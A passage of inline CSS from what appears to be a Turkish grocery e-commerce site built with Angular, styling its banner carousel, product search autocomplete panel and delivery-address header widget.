      fe-swiper-banner .swiper-wrapper {
        align-items: stretch
      }

      fe-swiper-banner .swiper-slide {
        height: auto
      }

      fe-swiper-banner .swiper-placeholder {
        margin-top: -21px
      }

      fe-swiper-banner .swiper-lazy-preloader {
        margin-left: -7px;
        margin-top: -7px;
        width: 14px;
        height: 14px;
        top: 70%
      }

      @media (min-width: 576px) {
        fe-swiper-banner .swiper-lazy-preloader {
          width: 42px;
          height: 42px;
          margin-left: -21px;
          margin-top: -21px
        }
      }

      fe-swiper-banner .swiper-button-next {
        border-radius: 50%;
        width: 3.5rem;
        height: 3.5rem;
        transform: translate(50%, -50%);
        padding-right: 20px;
        background-color: #fff;
        filter: drop-shadow(0 3px 3px rgba(0, 0, 0, .3));
        opacity: 1;
        color: #000;
        right: 0;
        margin: 0;
        top: 50%
      }

      @media (max-width: 576px) {
        fe-swiper-banner .swiper-button-next {
          transform: translate(50%, -50%) scale(.75)
        }
      }

      fe-swiper-banner .swiper-button-next:after {
        content: "";
        display: inline-block;
        height: .3em;
        width: .3em;
        border-style: solid;
        border-width: .05em .05em 0 0;
        transform: rotate(45deg)
      }

      fe-swiper-banner .swiper-button-next:after {
        left: -.05em;
        position: relative
      }

      fe-swiper-banner .swiper-button-prev {
        border-radius: 50%;
        width: 3.5rem;
        height: 3.5rem;
        transform: translate(-50%, -50%);
        padding-left: 20px;
        background-color: #fff;
        filter: drop-shadow(0 3px 3px rgba(0, 0, 0, .3));
        opacity: 1;
        color: #000;
        left: 0;
        top: 50%;
        margin: 0
      }

      @media (max-width: 576px) {
        fe-swiper-banner .swiper-button-prev {
          transform: translate(-50%, -50%) scale(.75)
        }
      }

      fe-swiper-banner .swiper-button-prev:after {
        content: "";
        display: inline-block;
        height: .3em;
        width: .3em;
        border-style: solid;
        border-width: .05em .05em 0 0;
        transform: rotate(225deg)
      }

      fe-swiper-banner .swiper-button-prev:after {
        left: .08em;
        position: relative
      }

      fe-swiper-banner .swiper-pagination.swiper-pagination-bullets {
        bottom: 1rem
      }

      fe-swiper-banner .swiper-pagination .swiper-pagination-bullet {
        width: 1rem;
        height: 1rem;
        background: var(--border-color--white);
        opacity: 1;
        border: 2px solid var(--border-color--white)
      }

      fe-swiper-banner .swiper-pagination .swiper-pagination-bullet-active {
        background: var(--primary-color__600);
        opacity: 1;
        border: 2px solid var(--border-color--white)
      }

      fe-swiper-banner img {
        width: 100%;
        height: auto;
        border-radius: 5px
      }

      fe-swiper-banner .swiper-wrapper {
        margin-top: 1.5rem
      }

      fe-swiper-banner .swiper-container {
        padding-bottom: .5rem;
        z-index: 0
      }

      @media (max-width: 576px) {
        fe-swiper-banner .swiper-container {
          padding-bottom: 1rem
        }
      }

      fe-swiper-banner .home-slider-banner {
        transform-origin: 0 0
      }
    </style>
    <style>
      [_nghost-isc-c277] {
        width: 100%
      }

      input[_ngcontent-isc-c277] {
        width: 100%;
        height: 2.75rem;
        border-radius: var(--base-border-radius);
        background-color: var(--background-color__LIGHT);
        border: 1px solid var(--background-color__GREY);
        padding-left: 40px;
        background: url(assets/icons/search--grey.svg) no-repeat 10px 11px;
        background-size: 16px;
        color: var(--background-color__DARK);
        font-size: 16px
      }

      input[_ngcontent-isc-c277]::placeholder {
        margin-top: -3px;
        font-size: 14px;
        color: var(--font-color__grey)
      }

      .product-search-combobox--panel {
        display: flex;
        flex-direction: column;
        max-height: initial !important;
        box-shadow: 0 4px 10px #0000001a;
        background-color: var(--background-color__LIGHTER);
        overflow: hidden !important;
        border: solid 1px var(--border-color--pale)
      }

      @media (min-width: 992px) {
        .product-search-combobox--panel {
          max-height: 533px !important
        }
      }

      .product-search-combobox--panel mat-option {
        font-size: 14px;
        line-height: 20px;
        height: auto;
        padding: 0
      }

      .product-search-combobox--panel mat-option a {
        width: 100%;
        height: 100%;
        display: block;
        padding: 5px 0
      }

      .product-search-combobox--panel h5 {
        font-size: 14px;
        color: var(--font-color__grey);
        font-weight: var(--font-weight-normal);
        margin-bottom: 10px;
        padding: 3px 0
      }

      .product-search-combobox--panel .trend-keywords,
      .product-search-combobox--panel .search-history {
        background-color: var(--background-color__LIGHT);
        padding: 10px 15px 0;
        overflow: auto;
        white-space: normal;
        margin: 0
      }

      .product-search-combobox--panel .trend-keywords .trend-keywords-header,
      .product-search-combobox--panel .trend-keywords .search-history-header,
      .product-search-combobox--panel .search-history .trend-keywords-header,
      .product-search-combobox--panel .search-history .search-history-header {
        display: flex;
        justify-content: space-between
      }

      .product-search-combobox--panel .trend-keywords .trend-keywords-header h5,
      .product-search-combobox--panel .trend-keywords .search-history-header h5,
      .product-search-combobox--panel .search-history .trend-keywords-header h5,
      .product-search-combobox--panel .search-history .search-history-header h5 {
        padding: 1rem 0 0 1rem;
        font-size: 1rem;
        font-weight: 600;
        font-stretch: normal;
        font-style: normal;
        line-height: 1.5;
        letter-spacing: normal;
        color: var(--basicColor900);
        margin: 0
      }

      .product-search-combobox--panel .trend-keywords .trend-keywords-header .search-history-delete,
      .product-search-combobox--panel .trend-keywords .search-history-header .search-history-delete,
      .product-search-combobox--panel .search-history .trend-keywords-header .search-history-delete,
      .product-search-combobox--panel .search-history .search-history-header .search-history-delete {
        padding: 1rem 0 0 1rem;
        color: var(--font-color__grey);
        font-size: 14px;
        font-weight: var(--font-weight-normal);
        margin-left: 10px;
        cursor: pointer
      }

      .product-search-combobox--panel .trend-keywords ul,
      .product-search-combobox--panel .search-history ul {
        list-style: none;
        padding: 0;
        margin: 0
      }

      .product-search-combobox--panel .trend-keywords .trend-keywords-item,
      .product-search-combobox--panel .trend-keywords .search-history-item,
      .product-search-combobox--panel .search-history .trend-keywords-item,
      .product-search-combobox--panel .search-history .search-history-item {
        display: inline-block;
        padding: 10px;
        font-size: 14px;
        border-radius: var(--base-border-radius);
        border: solid 1px var(--border-color--grey);
        background-color: var(--background-color__DARK)
      }

      .product-search-combobox--panel .trend-keywords .trend-keywords-item .trend-keywords-item-text,
      .product-search-combobox--panel .trend-keywords .trend-keywords-item .search-history-item-text,
      .product-search-combobox--panel .trend-keywords .search-history-item .trend-keywords-item-text,
      .product-search-combobox--panel .trend-keywords .search-history-item .search-history-item-text,
      .product-search-combobox--panel .search-history .trend-keywords-item .trend-keywords-item-text,
      .product-search-combobox--panel .search-history .trend-keywords-item .search-history-item-text,
      .product-search-combobox--panel .search-history .search-history-item .trend-keywords-item-text,
      .product-search-combobox--panel .search-history .search-history-item .search-history-item-text {
        font-size: 14px;
        color: var(--font-color__black);
        font-weight: var(--font-weight-normal);
        margin-left: 10px
      }

      .product-search-combobox--panel .category-results {
        background-color: var(--background-color__LIGHT);
        padding: 10px 15px 0
      }

      .product-search-combobox--panel .category-results ul {
        overflow: auto;
        white-space: nowrap;
        padding-left: 0;
        padding-bottom: 15px;
        margin: 0
      }

      .product-search-combobox--panel .category-results ul li {
        display: inline-block;
        padding: 10px;
        font-size: 14px;
        border-radius: var(--base-border-radius);
        border: solid 1px var(--border-color--pale);
        background-color: var(--background-color__LIGHTER)
      }

      .product-search-combobox--panel .category-results ul li+li {
        margin-left: 15px
      }

      .product-search-combobox--panel .category-results ul li small {
        vertical-align: middle;
        margin-top: -2px;
        display: inline-block;
        color: var(--font-color__dark-green)
      }

      .product-search-combobox--panel .search-result-items,
      .product-search-combobox--panel .product-results {
        flex: 1 1 auto;
        padding: 15px;
        overflow-y: auto;
        overflow-x: hidden
      }

      .product-search-combobox--panel .product-results:after {
        content: "";
        display: block;
        position: sticky;
        bottom: -15px;
        left: 0;
        font-weight: var(--font-weight-lightest);
        text-align: center;
        background-image: linear-gradient(transparent, var(--background-color__LIGHTER));
        margin: 0;
        padding: 15px 0
      }

      @media (min-width: 992px) {
        .product-search-combobox--panel .product-results {
          max-height: 155px
        }
      }

      @media (min-width: 992px) {
        .product-search-combobox--panel .search-result-items {
          max-height: 220px
        }
      }

      .product-search-combobox--panel .panel-actions,
      .product-search-combobox--panel .close-option {
        display: flex;
        justify-content: center;
        border-top: solid 1px var(--border-color--pale);
        width: 100%;
        font-size: 14px;
        background-color: var(--background-color__LIGHTER);
        text-align: center
      }

      @media (min-width: 992px) {

        .product-search-combobox--panel .panel-actions,
        .product-search-combobox--panel .close-option {
          font-size: 16px
        }
      }

      .product-search-combobox--panel .panel-actions a,
      .product-search-combobox--panel .close-option a {
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis
      }

      .product-search-combobox--panel .close-option {
        height: 50px
      }

      .product-search-combobox--panel fe-search-not-found {
        padding: 10px
      }

      .product-search-combobox--panel fe-search-not-found i {
        width: 160px;
        height: 126px;
        margin: auto
      }

      @media (max-width: 768px) {
        .combobox-overlay {
          width: 100vw !important;
          height: calc(100vh - 58px) !important;
          left: 0 !important
        }

        .combobox-overlay .mat-autocomplete-panel {
          border: none;
          top: 8px;
          box-shadow: inset 0 5px 10px -5px #0003
        }

        .combobox-overlay .mat-autocomplete-panel .bottom-actions {
          position: fixed;
          bottom: 0
        }
      }

      .migros[_ngcontent-isc-c277] {
        position: relative;
        margin-left: 1.5rem;
        margin-right: 1.5rem
      }

      @media (max-width: 768px) {
        .migros[_ngcontent-isc-c277] {
          margin: 0
        }
      }

      .migros[_ngcontent-isc-c277] input[_ngcontent-isc-c277] {
        min-width: 17rem !important;
        text-overflow: ellipsis;
        border: solid 1px var(--basicColor400);
        border-radius: 10px;
        outline: none;
        cursor: pointer;
        font-size: .875rem;
        font-weight: 600
      }

      .migros[_ngcontent-isc-c277] .migros-search-right-button[_ngcontent-isc-c277] {
        position: absolute;
        background-color: var(--brandColorPrimary700);
        color: #fff;
        right: 0;
        top: 0;
        width: 60px;
        height: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 0 10px 10px 0;
        cursor: pointer
      }

      @media (max-width: 768px) {
        .migros[_ngcontent-isc-c277] .migros-search-right-button[_ngcontent-isc-c277] {
          display: none
        }
      }

        {
        width: 100%
      }

      @media (max-width: 768px) {
        .product-search-combobox--panel {
          position: fixed !important;
          left: 0;
          top: 185px !important;
          right: 0;
          bottom: 0
        }
      }

      .product-search-combobox--panel.migros {
        background-color: #fff
      }

      @media (max-width: 768px) {
        .product-search-combobox--panel.migros {
          top: 80px !important
        }
      }

      @media (max-width: 768px) {
        .product-search-combobox--panel.migros .product-results {
          height: 100px
        }
      }

      .product-search-combobox--panel.migros .product-results a {
        color: #000;
        padding: .5rem .1rem
      }

      @media (max-width: 768px) {
        .product-search-combobox--panel.migros .keyword-results {
          height: 100px;
          overflow: auto
        }
      }

      .product-search-combobox--panel.migros .keyword-results a {
        padding: .5rem 1rem;
        display: flex;
        justify-content: space-between
      }

      .product-search-combobox--panel.migros .keyword-results a span {
        color: #000
      }

      .product-search-combobox--panel.migros .keyword-results a small {
        color: var(--font-color__grey);
        font-size: .75rem;
        font-weight: var(--font-weight-normal);
        margin-left: 10px;
        cursor: pointer
      }

      @media (min-width: 768px) {
        .product-search-combobox--panel.migros .back-button {
          display: none
        }
      }

      .product-search-combobox--panel.migros .category-results,
      .product-search-combobox--panel.migros .search-result-items {
        border-top: 1px solid var(--basicColor300);
        border-bottom: 1px solid var(--basicColor300);
        padding: 0
      }

      @media (max-width: 768px) {

        .product-search-combobox--panel.migros .category-results,
        .product-search-combobox--panel.migros .search-result-items {
          max-height: 140px
        }
      }

      .product-search-combobox--panel.migros .category-results h5,
      .product-search-combobox--panel.migros .search-result-items h5 {
        padding: 1rem 0 0 1rem;
        font-size: 1rem;
        font-weight: 600;
        font-stretch: normal;
        font-style: normal;
        line-height: 1.5;
        letter-spacing: normal;
        color: var(--basicColor900);
        margin: 0
      }

      .product-search-combobox--panel.migros .category-results ul,
      .product-search-combobox--panel.migros .search-result-items ul {
        padding-left: 1rem
      }

      .product-search-combobox--panel.migros .category-results ul li,
      .product-search-combobox--panel.migros .search-result-items ul li {
        border-radius: 10px;
        border: solid 1px var(--basicColor900);
        font-size: .75rem;
        font-weight: 600;
        font-stretch: normal;
        font-style: normal;
        line-height: 1.33;
        letter-spacing: normal;
        text-align: center;
        color: var(--basicColor900);
        margin-top: 1rem
      }

      .product-search-combobox--panel.migros .category-results ul li a,
      .product-search-combobox--panel.migros .search-result-items ul li a {
        color: var(--basicColor900)
      }

      .product-search-combobox--panel.migros .keyword-results,
      .product-search-combobox--panel.migros .product-results {
        margin-bottom: 1rem
      }

      .product-search-combobox--panel.migros .search-result-items {
        border-top: none
      }

      .product-search-combobox--panel.migros .search-result-items .search-result-item {
        padding: 1rem 0 0 1rem
      }

      .product-search-combobox--panel.migros .search-result-items .search-result-item fe-product-image {
        border: solid 1px #f5f3f2;
        border-radius: 3px;
        height: 70px;
        width: 70px
      }

      .product-search-combobox--panel.migros .search-result-items .search-result-item fe-product-name a,
      .product-search-combobox--panel.migros .search-result-items .search-result-item fe-product-brand a {
        color: var(--basicColor900)
      }

      .product-search-combobox--panel.migros .search-result-items .search-result-item fe-product-price {
        color: var(--brandColorPrimary700)
      }

      .product-search-combobox--panel.migros .search-container--empty {
        padding: 0
      }

      .product-search-combobox--panel.migros .search-container--empty .icon {
        background-image: url(assets/icons/search-not-found-grey.svg);
        background-repeat: no-repeat;
        background-size: contain;
        background-position: center;
        height: 3.5rem
      }

      .product-search-combobox--panel.migros .search-container--empty h5 {
        font-weight: 600;
        font-stretch: normal;
        font-style: normal;
        line-height: 1.5;
        letter-spacing: normal;
        color: var(--basicColor900) !important;
        margin: 0
      }

      .product-search-combobox--panel.migros .search-container--empty .search-info {
        margin-top: 1rem !important
      }

      .product-search-combobox--panel.migros .search-container--empty p {
        padding: 0
      }

      .migros input {
        background: url(assets/icons/search.svg) no-repeat 10px 10px
      }

      .sanalmarket[_nghost-isc-c277] input[_ngcontent-isc-c277],
      .sanalmarket [_nghost-isc-c277] input[_ngcontent-isc-c277] {
        padding-left: 0;
        text-indent: .75rem;
        background-image: none
      }

      .mion[_nghost-isc-c277] .migros-search-right-button[_ngcontent-isc-c277],
      .mion [_nghost-isc-c277] .migros-search-right-button[_ngcontent-isc-c277] {
        color: var(--basicColor900)
      }
    </style>
    <style>
      .mat-autocomplete-panel {
        min-width: 112px;
        max-width: 280px;
        overflow: auto;
        -webkit-overflow-scrolling: touch;
        visibility: hidden;
        max-width: none;
        max-height: 256px;
        position: relative;
        width: 100%;
        border-bottom-left-radius: 4px;
        border-bottom-right-radius: 4px
      }

      .mat-autocomplete-panel.mat-autocomplete-visible {
        visibility: visible
      }

      .mat-autocomplete-panel.mat-autocomplete-hidden {
        visibility: hidden
      }

      .mat-autocomplete-panel-above .mat-autocomplete-panel {
        border-radius: 0;
        border-top-left-radius: 4px;
        border-top-right-radius: 4px
      }

      .mat-autocomplete-panel .mat-divider-horizontal {
        margin-top: -1px
      }

      .cdk-high-contrast-active .mat-autocomplete-panel {
        outline: solid 1px
      }

      mat-autocomplete {
        display: none
      }
    </style>
    <style>
      .mat-option {
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        display: block;
        line-height: 48px;
        height: 48px;
        padding: 0 16px;
        text-align: left;
        text-decoration: none;
        max-width: 100%;
        position: relative;
        cursor: pointer;
        outline: none;
        display: flex;
        flex-direction: row;
        max-width: 100%;
        box-sizing: border-box;
        align-items: center;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
      }

      .mat-option[disabled] {
        cursor: default
      }

      [dir=rtl] .mat-option {
        text-align: right
      }

      .mat-option .mat-icon {
        margin-right: 16px;
        vertical-align: middle
      }

      .mat-option .mat-icon svg {
        vertical-align: top
      }

      [dir=rtl] .mat-option .mat-icon {
        margin-left: 16px;
        margin-right: 0
      }

      .mat-option[aria-disabled=true] {
        -webkit-user-select: none;
        user-select: none;
        cursor: default
      }

      .mat-optgroup .mat-option:not(.mat-option-multiple) {
        padding-left: 32px
      }

      [dir=rtl] .mat-optgroup .mat-option:not(.mat-option-multiple) {
        padding-left: 16px;
        padding-right: 32px
      }

      .mat-option.mat-active::before {
        content: ""
      }

      .cdk-high-contrast-active .mat-option[aria-disabled=true] {
        opacity: .5
      }

      .cdk-high-contrast-active .mat-option.mat-selected:not(.mat-option-multiple)::after {
        content: "";
        position: absolute;
        top: 50%;
        right: 16px;
        transform: translateY(-50%);
        width: 10px;
        height: 0;
        border-bottom: solid 10px;
        border-radius: 10px
      }

      [dir=rtl] .cdk-high-contrast-active .mat-option.mat-selected:not(.mat-option-multiple)::after {
        right: auto;
        left: 16px
      }

      .mat-option-text {
        display: inline-block;
        flex-grow: 1;
        overflow: hidden;
        text-overflow: ellipsis
      }

      .mat-option .mat-option-ripple {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        pointer-events: none
      }

      .mat-option-pseudo-checkbox {
        margin-right: 8px
      }

      [dir=rtl] .mat-option-pseudo-checkbox {
        margin-left: 8px;
        margin-right: 0
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      [_nghost-isc-c354] {
        display: block
      }

      @media (max-width: 992px) {
        [_nghost-isc-c354] {
          width: 100%
        }
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] {
        color: var(--basicColor900);
        background-color: transparent;
        outline: none;
        border: none;
        padding: 0
      }

      @media (max-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] {
          margin: 0;
          width: 100%
        }
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] {
        border: 1px solid rgba(0, 0, 0, .12);
        border-radius: 8px;
        width: 450px;
        cursor: pointer;
        height: 3rem;
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: .1rem 1rem;
        position: relative
      }

      @media (max-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] {
          padding: .25rem 1rem
        }
      }

      @media (max-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] {
          width: auto;
          border-bottom: 1px solid rgba(0, 0, 0, .12);
          border-top: none;
          border-radius: 0
        }
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .choose-address-container[_ngcontent-isc-c354] {
        display: flex;
        justify-content: space-between;
        flex-direction: row;
        width: 100%
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .choose-address-container[_ngcontent-isc-c354] .choose-address[_ngcontent-isc-c354] {
        display: flex;
        align-items: center
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .choose-address-container[_ngcontent-isc-c354] .choose-address[_ngcontent-isc-c354] .icon-wrapper[_ngcontent-isc-c354] {
        margin-right: .5rem;
        font-size: .875rem
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .choose-address-container[_ngcontent-isc-c354] .icon-wrapper[_ngcontent-isc-c354] {
        display: flex;
        align-items: center;
        justify-content: center;
        background-color: var(--basicColor200);
        width: 1.5rem;
        height: 1.5rem;
        border-radius: 4px
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] {
        display: flex;
        align-items: center;
        width: 100%;
        position: relative
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .fa-heart[_ngcontent-isc-c354] {
        color: var(--brandColorError600)
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .foundation-text-wrapper[_ngcontent-isc-c354] {
        text-align: left;
        margin-right: auto;
        margin-left: 1rem
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] {
        display: flex;
        width: 100%
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-row[_ngcontent-isc-c354] {
        display: flex;
        align-items: center;
        min-width: 200px
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-row[_ngcontent-isc-c354]:after {
        content: url(assets/icons/header-delivery-schedule-separator.svg);
        margin-left: .625rem
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-row[_ngcontent-isc-c354] img[_ngcontent-isc-c354] {
        width: 20px;
        height: 26px
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-row[_ngcontent-isc-c354] fa-icon[_ngcontent-isc-c354] {
        margin-left: auto
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-row[_ngcontent-isc-c354] .delivery-options-inner-text[_ngcontent-isc-c354] {
        margin: 0 1rem;
        text-align: left;
        white-space: normal;
        word-break: break-word;
        overflow: hidden;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        text-overflow: ellipsis
      }

      @media (max-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-row[_ngcontent-isc-c354] .delivery-options-inner-text[_ngcontent-isc-c354] {
          margin: .6rem
        }
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-row[_ngcontent-isc-c354] .delivery-options-inner-text__hemen[_ngcontent-isc-c354] {
        display: flex;
        flex-direction: column;
        width: 100%;
        text-align: left;
        margin-left: .75rem;
        display: inline-block;
        max-width: 24rem;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap
      }

      @media (max-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-row[_ngcontent-isc-c354] .delivery-options-inner-text__hemen[_ngcontent-isc-c354] {
          width: 7.5rem;
          display: inline-block;
          max-width: 7.5rem;
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap
        }
      }

      @media (max-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-row[_ngcontent-isc-c354] {
          min-width: unset
        }
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-row.yemek[_ngcontent-isc-c354] {
        flex-grow: 1
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-row.yemek[_ngcontent-isc-c354]:after {
        content: none
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .delivery-row[_ngcontent-isc-c354] {
        display: flex;
        justify-content: space-between;
        width: 100%;
        align-items: center
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .delivery-row[_ngcontent-isc-c354] .closest-time[_ngcontent-isc-c354] {
        display: flex;
        text-align: left;
        flex-direction: column
      }

      @media (max-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .delivery-row[_ngcontent-isc-c354] .closest-time[_ngcontent-isc-c354] {
          margin: 0 .5rem
        }
      }

      @media (min-width: 768px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .delivery-row[_ngcontent-isc-c354] .closest-time[_ngcontent-isc-c354] {
          margin-left: 1rem
        }
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .delivery-row[_ngcontent-isc-c354] .closest-time[_ngcontent-isc-c354] .delivery-options-inner-time[_ngcontent-isc-c354] {
        white-space: nowrap;
        color: var(--systemColorSuccess600)
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .delivery-row[_ngcontent-isc-c354] .closest-time[_ngcontent-isc-c354] .delivery-options-inner-text[_ngcontent-isc-c354] {
        margin: 0
      }

      @media (max-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .delivery-row[_ngcontent-isc-c354] {
          flex-basis: auto;
          width: auto
        }
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .shipment[_ngcontent-isc-c354] {
        display: flex;
        margin-left: .5rem;
        color: var(--brandColorInfo600)
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .shipment[_ngcontent-isc-c354] .sm-extra-inner-text[_ngcontent-isc-c354] {
        margin-left: 1rem
      }

      @media (max-width: 768px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .shipment[_ngcontent-isc-c354] .sm-extra-inner-text[_ngcontent-isc-c354] {
          text-align: left
        }
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .shipment[_ngcontent-isc-c354] img[_ngcontent-isc-c354] {
        object-fit: contain;
        max-width: 1.5rem;
        max-height: 100%;
        width: auto;
        height: auto
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .location-name[_ngcontent-isc-c354] {
        display: inline-block;
        max-width: 100%;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
        display: block
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .eta[_ngcontent-isc-c354] {
        display: grid;
        grid-template-columns: 1.4rem 1fr;
        grid-column-gap: 1rem;
        text-align: left;
        margin-left: .5rem
      }

      @media (min-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .eta[_ngcontent-isc-c354] {
          margin-left: 2rem
        }
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .eta[_ngcontent-isc-c354] img[_ngcontent-isc-c354] {
        margin: auto 0
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .eta[_ngcontent-isc-c354] .minutes[_ngcontent-isc-c354] {
        display: block
      }

